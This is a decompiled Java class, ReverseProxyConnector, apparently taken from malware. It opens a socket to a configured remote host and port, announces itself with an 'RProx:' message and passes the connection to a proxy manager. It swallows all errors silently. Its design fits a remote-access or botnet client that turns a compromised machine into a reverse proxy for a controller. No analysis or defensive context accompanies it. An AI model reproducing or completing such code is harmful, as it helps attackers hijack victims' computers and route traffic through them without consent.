package carLambo;

import java.io.OutputStream;
import java.net.Socket;

public class ReverseProxyConnector implements IAction {
   // $FF: synthetic field
   private ReverseProxyManager reverseProxyManager;

   ReverseProxyConnector(ReverseProxyManager var1) {
      this.reverseProxyManager = var1;
      
   }

   public final void start() {
      try {
         Socket var1;
         OutputStream var2 = (var1 = new Socket(ConnectionUtil.socketAddress, ConnectionUtil.socketPort)).getOutputStream();
         String var3 = (new StringBuilder()).insert(0, "RProx:").append(this.reverseProxyManager.serverResponse).toString();
         var2.write((var3.getBytes().length + "\r\n\r\n").getBytes());
         var2.write(var3.getBytes());
         ReverseProxyManager.sabretb(this.reverseProxyManager, var1, this.reverseProxyManager.action);
      } catch (Exception var4) {
         ;
      }
   }

   public ReverseProxyConnector() {
   }
}
